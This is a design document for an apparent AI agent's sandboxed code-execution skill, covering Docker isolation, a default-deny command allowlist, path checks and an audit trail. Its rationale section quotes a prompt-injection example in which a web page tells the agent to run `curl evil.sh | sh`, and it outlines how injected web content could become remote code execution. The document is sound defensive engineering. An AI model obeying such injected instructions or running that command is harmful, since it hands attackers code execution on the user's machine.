# Sandboxed exec (`/code` skill)

Loon can run commands and create/edit/delete files, but only inside a layered sandbox and
only through the deliberately-invoked `/code` skill — never from a normal chat message.

## Why it's built this way

The chat loop already ingests untrusted web content (`search_web`/`read_web_page`). If an
exec tool shared that loop, a prompt-injecting page ("run `curl evil.sh | sh`") would become
remote code execution. So exec/file tools are wired **only** into the skill registry
(`app.py`), reachable via `/skill code <task>`, and are kept out of `DEFAULT_TOOLS`. This
separation is load-bearing, not a preference — see the header comment in `tools/builtins.py`.

## The three layers (`src/loon_agent/exec/`)

1. **Isolation boundary — Docker (`docker_backend.py`).** Each command runs in a fresh,
   auto-removed container: one bind mount (the workspace at `/workspace`, nothing else — no
   docker socket, no host secrets), `--network=none` by default, non-root, read-only rootfs
   with a `/tmp` tmpfs, and memory/cpu/pid limits. The timeout is enforced from outside the
   container. This is the only real security boundary; the layers below catch mistakes early
   and make them auditable.
2. **Allow/deny policy (`policy.py`, pure/no-I/O).** A tiny unconditional hardline denylist
   (disk wipes, fork bombs, sandbox-escape attempts) plus a **default-deny allowlist** — a
   command's resolved program name must be in `LOON_EXEC_ALLOWED_BINS` or it is refused. File
   ops are checked with `check_path`, which resolves symlinks and `..` and refuses anything
   outside the workspace.
3. **Audit trail.** Every attempt sets `loon.exec.*` attributes (command, policy decision,
   exit code, duration, truncated output) on the skill engine's existing `execute_tool` OTel
   span — so with `LOON_OTEL=otlp` on, there's a record of everything loon tried to run or
   write, allowed or denied.

Denied or failed commands are **reported, not fatal**: they flow into the skill's results so
the report step surfaces them (deny-and-report). There is deliberately no unsandboxed
host-subprocess backend.

## Enabling it

1. Build + pin the toolbox image:
   ```bash
   docker build -f docker/loon-toolbox.Dockerfile -t loon-toolbox:0.1 .
   docker inspect --format '{{index .RepoDigests 0}}' loon-toolbox:0.1   # get the digest to pin
   ```
2. In `.env` (see `.env.example` for the full list):
   ```
   LOON_EXEC_BACKEND=docker
   LOON_EXEC_IMAGE=loon-toolbox@sha256:...        # pin by digest, not :latest
   LOON_EXEC_ALLOWED_BINS=git,python3,pytest,ruff,ls,cat,grep,mkdir,mv,cp
   # LOON_EXEC_WORKSPACE=.loon/workspace          # where writes land
   # LOON_EXEC_NETWORK=none                        # none | bridge
   ```
   The image having a binary is necessary but not sufficient — the allowlist is the gate.
3. `/skill code "run the tests in <a cloned repo under the workspace>"`.

A running Docker daemon is required. As a macOS LaunchAgent, loon may start before Docker
Desktop is up after a reboot; `DockerExecBackend.preflight()` degrades to a clear error
("docker daemon unreachable") rather than hanging, and the `/code` skill reports it.

## Trust knobs deliberately left narrow in v1

Workspace defaults to a dedicated `.loon/workspace` (not loon's own repo, not arbitrary host
dirs); network off; Docker-only. Widening any of these is a config or follow-up change, each
a real trust decision — see `docs/` / the plan for the reasoning.
